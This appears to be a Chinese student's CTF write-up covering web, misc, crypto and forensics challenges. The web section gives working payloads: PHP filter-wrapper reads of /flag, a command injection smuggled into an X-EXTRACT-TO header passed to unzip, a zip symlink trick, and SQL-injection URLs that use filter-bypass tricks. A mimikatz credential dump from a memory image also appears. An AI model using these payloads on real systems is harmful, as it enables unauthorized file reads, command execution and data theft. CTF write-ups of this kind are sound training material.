感觉还是太菜了，最后甚至没有进前100，也有投入时间一般的原因，学一点其他方向然后后面方便打校赛吧

# Web

## Popgadget

https://bbs.kanxue.com/thread-271714.htm

wc,对于php的各种pop链还是太生疏了

直接放个wp把



## zupload

审计源码然后将action改为/flag即可获取flag

## zupload-pro

直接用php伪协议读取**php://filter/read=convert.base64-encode/resource=/flag**

## zupload-pro-plus-max

一直在卡我的题目，后面看了wp才知道include解析zip包中的php代码即可

## zupload-pro-max

同样用php伪协议读取php://filter/read=convert.base64-encode/resource=/flag

## zupload-pro-plus-max-ultra

代码中有

```php
$extract_to = $_SERVER['HTTP_X_EXTRACT_TO'] ?? 'uploads/';

...

exec('unzip ' . $file_tmp . ' -d ' . $extract_to);
```

直接往 Header 中传入 `X-EXTRACT-TO: .; cat /flag > flag.txt` 随便上传个文件，然后访问 `/flag.txt` 把 Flag 下载下来就行了。

## zupload-pro-plus-max-ultra-premium

这题是 Unzip 软链接漏洞，先准备个 Payload：

```
touch /flag
ln -s /flag flag
zip --symlinks payload.zip flag
```

上传后再下载 `/uploads/flag` 就行了。

## sql教学局

感觉比较简单的sql注入！甚至有回显

主要是用双写和/**/绕过空格，感觉跟信息安全综合实践二的web题差不多

flag
第一段：flag{f5729aaa-
http://101.32.220.189:31777/challenge.php?user=1'/**/union/**/selselectect/**/flag/**/frfromom/**/secret.passwoorrd%23
第二段：3d49-475e-9731  http://101.32.220.189:31777/challenge.php?user=1'/**/union/**/selselectect/**/grade/**/frfromom/**/scoorre/**/where/**/student/**/like/**/'begin'%23
第三段：-e15fd5d2891d} 
爆字段：
http://101.32.220.189:32067/challenge.php?user=1'/**/union/**/selselectect/**/group_concat(column_name)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/'scoorre'%23
flag{f5729aaa-3d49-475e-9731-e15fd5d2891d} 

# Misc

## tupper

先base64再

[tupper解密](https://tuppers-formula.ovh/)

## check ln

直接base32转码

## devils's word

先转换语言，然后搜索发现是温州话，之前找到过魔鬼语言温州话，但是没具体往下走

```python
with open("devil's word.txt", 'r') as f:
    data = f.read().strip().split(' ')

table = {
    'leng': '0', 'lia': '2', 'sa': '3', 'sii': '4', 'bo': '8',
    'ng': '5', 'leu': '6', 'cai': '7', 'jau': '9',
    'a': 'a', 'b': 'b', 'c': 'c', 'd': 'd', 'e': 'e', 'f': 'f'}

result = b''
for i in range(0, len(data), 2):
    result += bytes([int(table[data[i]]+table[data[i + 1]], 16)])

print(result.decode())
```

## where  is crazyman 1.0

直接google搜图然后发现为秋叶原

## where is crazyman v2.0

直接google搜图找到facebook

然后发现即可

## Crypto

感觉对RSA算法的理解有问题

这是一个多素数RSA算法问题

```python
from Crypto.Util.number import *
import gmpy2

def fakeN_list():
    puzzle_list = []

    for i in range(15):
        r = getPrime(32)
        puzzle_list.append(r)

    p = getPrime(32)
    q = getPrime(32)
    com = p * q

    puzzle_list.append(com)

    return puzzle_list

def encrypt(m, e, fake_n_list):
    fake_n = 1
    for i in range(len(fake_n_list)):
        fake_n *= fake_n_list[i]

    really_n = 1
    for i in range(len(fake_n_list) - 1):
        really_n *= fake_n_list[i]

    c = pow(m, e, really_n)

    print("c =", c)
    print("fake_n =", fake_n)

e = 65537
r_s = [3244171123, 3702684709, 3072724321, 4018595311, 3724163987, 3020377819, 3771381161, 2785127861, 3892394453, 2884753607, 3784497139, 3794842819, 3122320321, 3961291277, 2753880739, 3057624863, 3108016309]
c = 65357276094579455978357225670976535341727886147857522808384849982116709060700184781790632917498365870903934069344805591544583535937894022934706
fake_n = 914762571999137286435259336379720674119704253903171474927358573188112683048519393703661411927034789214975261873387988753423525574742149601424917938820732224411251
flag_real = "flag{test}".encode()
m = bytes_to_long(flag_real)

for p in r_s:
    for q in r_s:
        if q == p:
            continue
        else:
            really_n = int(fake_n // (p * q))
            new_list = [x for x in r_s if x not in {p, q}]
            phi = 1
            for i in new_list:
                phi *= i-1
            d = gmpy2.invert(e, phi)
            flag = pow(c, d, really_n)
            print(flag)
            print(long_to_bytes(flag))
```

# Forensics

## 逆向工程(reverse)入门指南

有不可见字符，直接复制粘贴出来即为flag

## 学取证咯 - cmd

直接cmdline可以发现flag

## 学取证咯-还记得ie吗学取证咯 - 还记得 ie 吗？

$ vol.py -f 学取证咯.raw --profile=Win7SP1x64 iehistory

## 学取证咯 - 计算机的姓名？

$ vol.py -f 学取证咯.raw --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"

## 学取证咯 - 想登录我的计算机吗?

mimikatz一把梭

```shell
vol.py -f 学取证咯.raw --profile=Win7SP1x64 mimikatz
```

##  学取证咯 - 机密文件

filescan 扫描到桌面有个机密文件.docx，dump 下来打开就是了

## 学取证咯 - 真的是取证吗？

关键逻辑如下：

![](https://notes.sjtu.edu.cn/uploads/upload_9d6f2a8535a8eadc243df34a72e9c1df.png)

桌面有个 flag_is_here.exe, dump 下来，ida 搜 flag 然后交叉引用找到关键函数，发现就一个简单的异或 FLAG_KEY 不知道，直接根据密文的第一位和 flag 的 f 异或，得到 key 为 121 

; DATA XREF: sub_401460+102↑o
.rdata:0040B06D unk_40B06D      db 0BBh                 ; DATA XREF: sub_401460+112↑o

这里指交叉引用（说的是哪里引用了这部分)

`data =[31, 21, 24, 30, 2, 32, 73, 15,
       74, 38, 21, 74, 57, 11, 23, 74,
       29, 38, 17, 73, 15, 15, 38, 13,
       73, 38, 31, 73, 11, 74, 23, 76,
       16, 26, 76, 4]

for i in data:
    print(chr(i ^ 121), end="")

## 饥渴 C 猫 is hacker!

看一位师傅的wp发现

payload.bin 是使用 USB Rubber Ducky 编译 DuckyScript 后生成的文件 github 找到解析工具 [Duck-Decoder](https://github.com/JPaulMora/Duck-Decoder) 解析 payload.bin 就能看到 flag 了
